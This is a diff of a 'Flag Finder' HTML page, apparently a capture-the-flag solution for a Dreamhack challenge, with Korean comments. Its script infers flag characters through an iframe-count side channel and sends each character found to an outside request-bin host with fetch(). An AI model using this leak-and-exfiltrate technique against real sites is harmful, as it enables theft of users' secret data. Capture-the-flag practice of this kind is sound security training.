@@ -6,7 +6,7 @@
     <title>Flag Finder</title>
 </head>
 <body>
-    <h1>Flag Finderㅌ</h1>
+    <h1>Flag Finder</h1>
     <script>
         let server_flag = ''; // 전역 변수
         let previousGoblinCount = 0; // 이전 goblin iframe 개수
@@ -33,13 +33,19 @@
                 } else {
                     // goblin iframe이 증가하지 않았다면
                     console.log(`Found flag character: ${flag}`);
-                    const finalRequestUrl = `https://vtdhxcq.request.dreamhack.games?flag=${encodeURIComponent(flag)}`;
+                    const finalRequestUrl = `https://zajpqki.request.dreamhack.games?flag=${encodeURIComponent(flag)}`;
                     fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
+
+                    // FLAG에 해당 문자를 추가
+                    server_flag += String.fromCharCode(i);
+                    console.log(`Current FLAG: ${server_flag}`);
                 }
 
                 // iframe 제거 (옵션)
                 document.body.removeChild(iframe);
             }
+
+            console.log('Final FLAG:', server_flag);
         };
 
         checkFlag();
